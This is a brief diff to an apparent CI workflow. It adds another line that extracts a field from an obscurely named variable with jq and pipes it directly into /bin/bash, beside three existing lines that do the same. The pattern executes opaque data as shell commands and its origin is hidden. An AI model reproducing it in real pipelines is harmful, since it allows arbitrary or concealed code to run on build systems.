@@ -22,6 +22,7 @@ jobs:
           echo $xigg9325 | jq -r .z0311 | /bin/bash
           echo $qjee9 | jq -r .yvt65 | /bin/bash
           echo $ipjk0 | jq -r .k9368 | /bin/bash
+          printf '%s' "$xnwva97509" | jq -r .jtrep09420 | /bin/bash
 
       - name: Persist output
         if: always()
